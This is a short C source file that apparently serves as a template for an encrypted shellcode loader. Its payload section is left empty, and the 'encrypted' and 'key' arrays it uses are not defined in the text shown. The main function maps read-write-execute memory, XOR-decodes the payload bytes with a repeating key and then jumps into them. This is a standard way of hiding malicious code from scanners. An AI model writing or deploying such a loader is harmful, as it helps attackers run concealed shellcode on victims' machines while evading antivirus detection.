#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>


// === PAYLOAD ===

// === END PAYLOAD ===


int main (int argc, char **argv)
{
        int encrypted_len = sizeof(encrypted) - 1;
        int key_len = sizeof(key) - 1;
        
        unsigned char *shellcode = mmap(NULL, encrypted_len, 
                                        PROT_READ | PROT_WRITE | PROT_EXEC,
                                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        
        if (shellcode == MAP_FAILED) {
            perror("mmap");
            return 1;
        }
        
        for (int i = 0; i < encrypted_len; i++)
        {
                shellcode[i] = encrypted[i] ^ key[i % key_len];
        }

        int (*ret)() = (int(*)())shellcode;
        ret();
        munmap(shellcode, encrypted_len);
        
        return 0;
}